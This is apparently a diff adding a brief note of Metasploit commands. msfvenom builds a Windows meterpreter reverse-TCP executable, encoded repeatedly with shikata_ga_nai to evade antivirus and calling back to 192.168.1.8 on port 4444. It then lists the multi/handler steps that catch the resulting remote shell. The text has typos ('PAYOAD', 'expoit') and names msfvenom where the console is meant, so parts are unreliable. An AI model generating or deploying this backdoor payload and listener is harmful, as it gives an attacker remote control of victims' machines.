@@ -1,0 +1,12 @@
+CREATE PAYOAD:-
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.8 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 10 > payloadwin.exe
+
+EXECUTE PAYLOAD:-
+
+msfvenom
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+show options
+set LHOST 192.168.1.8
+set LPORT 4444
+expoit
